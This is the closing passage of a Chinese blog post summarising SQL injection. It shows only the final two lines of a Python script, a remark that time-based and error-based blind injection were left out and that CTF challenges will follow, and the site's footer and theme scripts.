+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span></span></span></code></pre></div><p>延时盲注和报错盲注没写，暂时就先这样，之后把bugku、buu等平台的SQL注入类型的题全做一遍，再水一篇。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2020-11-19 09:11:07">更新于 2020-11-19&nbsp;</span></div><div class=post-info-license><span><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/ data-title=SQL注入小结 data-hashtags=WEB><i class="fa-brands fa-twitter fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/ data-hashtag=WEB><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/ data-title=SQL注入小结><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/web/ class=post-tag title="标签 - WEB">WEB</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/buu-pwn-0x50-0x5f/ class=post-nav-item rel=prev title=BUU_PWN刷题_0x50-0x5F><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>BUU_PWN刷题_0x50-0x5F</a>
+<a href=/posts/python__re%E6%A8%A1%E5%9D%97%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/ class=post-nav-item rel=next title=Python__RE模块与正则表达式>Python__RE模块与正则表达式<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class=hugo-icon src=/images/hugo.min.svg alt="Hugo logo"> Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.3.2"><img class=fixit-icon src=/images/fixit.min.svg alt="FixIt logo"> FixIt</a></div><div class="footer-line copyright" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
+<span itemprop=copyrightYear>2024</span><span class=author itemprop=copyrightHolder>
+<a href=/></a></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class="variant-numeric d-none">0%</span></div></div><div id=mask></div><noscript><div class=noscript-warning>FixIt 主题在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=preload href=/lib/katex/katex.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/katex/katex.min.css></noscript><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/katex/katex.min.js defer></script><script src=/lib/katex/auto-render.min.js defer></script><script src=/lib/katex/copy-tex.min.js defer></script><script src=/lib/katex/mhchem.min.js defer></script><script src=/lib/cookieconsent/cookieconsent.min.js defer></script><script>window.config={code:{copyTitle:"复制到剪贴板",editLockTitle:"锁定可编辑代码块",editUnLockTitle:"解锁可编辑代码块",editable:!0,maxShownLines:10},comment:{enable:!1},cookieconsent:{content:{dismiss:"同意",link:"了解更多",message:"本网站使用 Cookies 来改善您的浏览体验。"},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script src=/js/theme.min.js defer></script></body></html>
